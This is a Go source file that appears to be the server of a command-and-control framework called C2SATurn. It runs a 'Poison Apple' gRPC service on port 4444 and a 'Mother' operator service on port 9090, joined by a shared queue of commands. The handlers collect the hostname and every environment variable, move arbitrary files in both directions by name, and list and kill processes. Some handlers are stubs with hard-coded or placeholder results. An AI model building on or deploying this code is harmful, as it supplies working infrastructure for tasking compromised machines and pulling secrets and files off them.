package main

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"sync"

	"github.com/h3bzzz/C2SATurn/grpcapi"

	"google.golang.org/grpc"
)

type poisonServer struct {
	work, output chan *grpcapi.Command
	mu           sync.Mutex
}

type motherServer struct {
	work, output chan *grpcapi.Command
	mu           sync.Mutex
}

func poisonApple(work, output chan *grpcapi.Command) *poisonServer {
	return &poisonServer{
		work:   work,
		output: output,
	}
}

func spawnMother(work, output chan *grpcapi.Command) *motherServer {
	return &motherServer{
		work:   work,
		output: output,
	}
}

func (s *poisonServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	var cmd = new(grpcapi.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return nil, errors.New("channel closed")
	default:
		return cmd, nil
	}
}

func (s *poisonServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	return &grpcapi.Empty{}, nil
}

func (s *poisonServer) GetSystemInfo(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.SystemInfo, error) {
	hostname, _ := os.Hostname()
	envVars := make(map[string]string)
	for _, env := range os.Environ() {
		parts := splitEnvVar(env)
		envVars[parts[0]] = parts[1]
	}
	return &grpcapi.SystemInfo{
		Hostname:     hostname,
		OS:           os.Getenv("OS"),
		Architecture: os.Getenv("ARCH"),
		Uptime:       os.Getenv("UPTIME"),
		EnvVars:      envVars,
	}, nil
}

func (s *poisonServer) UploadFile(stream grpcapi.PoisonApple_UploadFileServer) error {
	var fileData []byte
	var fileName string
	for {
		chunk, err := stream.Recv()
		if err == context.Canceled || (err == nil && len(chunk.Data) == 0) {
			break
		}
		if err != nil {
			return err
		}
		fileName = chunk.FileName
		fileData = append(fileData, chunk.Data...)
	}
	if err := os.WriteFile(fileName, fileData, 0644); err != nil {
		return err
	}
	return stream.SendAndClose(&grpcapi.Empty{})
}

func (s *poisonServer) DownloadFile(req *grpcapi.FileRequest, stream grpcapi.PoisonApple_DownloadFileServer) error {
	fileData, err := os.ReadFile(req.FileName)
	if err != nil {
		return err
	}

	chunkSize := 1024
	for i := 0; i < len(fileData); i += chunkSize {
		end := i + chunkSize
		if end > len(fileData) {
			end = len(fileData)
		}
		chunk := &grpcapi.FileChunk{
			Data:     fileData[i:end],
			FileName: req.FileName,
		}
		if err := stream.Send(chunk); err != nil {
			return err
		}
	}
	return nil
}

func (s *poisonServer) ListProcesses(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.ProcessList, error) {
	processes := []*grpcapi.Process{
		{PID: 1, Name: "init", User: "root", CPU: 0.0, Memory: 0.0},
		{PID: 2, Name: "systemd", User: "root", CPU: 0.0, Memory: 0.0},
		{PID: 3, Name: "sshd", User: "root", CPU: 0.0, Memory: 0.0},
		{PID: 4, Name: "bash", User: "root", CPU: 0.0, Memory: 0.0},
	}
	return &grpcapi.ProcessList{Processes: processes}, nil
}

func (s *poisonServer) KillProcess(ctx context.Context, req *grpcapi.ProcessRequest) (*grpcapi.CommandResult, error) {
	// Placeholder: Replace with actual process-killing logic
	return &grpcapi.CommandResult{
		Success: true,
		Message: fmt.Sprintf("Killed process with PID %d", req.PID),
	}, nil
}

func splitEnvVar(env string) [2]string {
	parts := [2]string{"", ""}
	split := len(env)
	for i, char := range env {
		if char == '=' {
			split = i
			break
		}
	}
	parts[0] = env[:split]
	if split < len(env) {
		parts[1] = env[split+1:]
	}
	return parts
}

func main() {
	var (
		poisonListener, poisonMotherListener net.Listener
		err                                  error
		opts                                 []grpc.ServerOption
		work, output                         chan *grpcapi.Command
	)

	work, output = make(chan *grpcapi.Command, 100), make(chan *grpcapi.Command, 100)
	poison := poisonApple(work, output)
	mother := spawnMother(work, output)

	if poisonListener, err = net.Listen("tcp", "localhost:4444"); err != nil {
		log.Fatal(err)
	}
	if poisonMotherListener, err = net.Listen("tcp", "localhost:9090"); err != nil {
		log.Fatal(err)
	}

	grpcPoisonServer := grpc.NewServer(opts...)
	grpcMotherServer := grpc.NewServer(opts...)

	grpcapi.RegisterPoisonAppleServer(grpcPoisonServer, poison)
	grpcapi.RegisterMotherServer(grpcMotherServer, mother)

	go func() {
		log.Println("Starting Poison Apple Server on localhost:4444...")
		if err := grpcPoisonServer.Serve(poisonListener); err != nil {
			log.Fatalf("Failed to start Poison Apple server: %v", err)
		}
	}()

	log.Println("Starting Mother Server on localhost:9090...")
	if err := grpcMotherServer.Serve(poisonMotherListener); err != nil {
		log.Fatalf("Failed to start Mother server: %v", err)
	}
}
